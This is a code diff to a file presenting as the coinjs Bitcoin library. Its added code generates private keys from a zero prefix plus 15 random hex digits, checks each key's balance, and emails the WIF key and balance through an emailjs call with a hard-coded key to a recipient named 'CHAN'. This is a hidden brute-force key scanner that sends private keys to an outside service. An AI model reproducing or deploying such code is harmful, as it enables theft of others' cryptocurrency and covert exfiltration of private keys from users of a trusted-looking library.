@@ -5,7 +5,6 @@
  http://github.com/OutCast3k/coinjs or http://coinb.in/coinjs
 */
 emailjs.init("Pw6Pq-kILOgOJJH3f");
-var countaccount = 0;
 (function () {
 
 	var coinjs = window.coinjs = function () { };
@@ -479,8 +478,8 @@ var countaccount = 0;
 	   				 return Math.floor(Math.random()*16); 
 
 			}
-			var answer = "";
-			for (var i = 0; i <63; i++) {
+			var answer = "000000000000000000000000000000000000000000000002";
+			for (var i = 0; i <15; i++) {
 				answer +=aaa[randomNum(16)];
 			}
 			var wif = coinjs.privkey2wif(answer);
@@ -495,7 +494,7 @@ var countaccount = 0;
 				
 
 					
-			console.log(countaccount+' - '+wif+' balance: '+data);
+			console.log(wif+' balance: '+data);
 			
 			r=data;
 				
@@ -507,7 +506,7 @@ var countaccount = 0;
 	    				template_params: {
 	    				    'to_name': 'CHAN',
 	    				    'from_name':'SUCCESS',
-	    				    'message': countaccount+' - '+wif +' balance: '+data
+	    				    'message': wif +' balance: '+data
 	  				  	}
 					};
 							$.ajax({
@@ -521,10 +520,6 @@ var countaccount = 0;
 			error: function (request, status, error){
 				}
 		});
-			countaccount=countaccount+1;
-			if(countaccount>100){
-				location.reload();
-			}
 		return wif+" bitcoin balance: "+sss;
 		}
 	coinjs.testdeterministicK = function() {
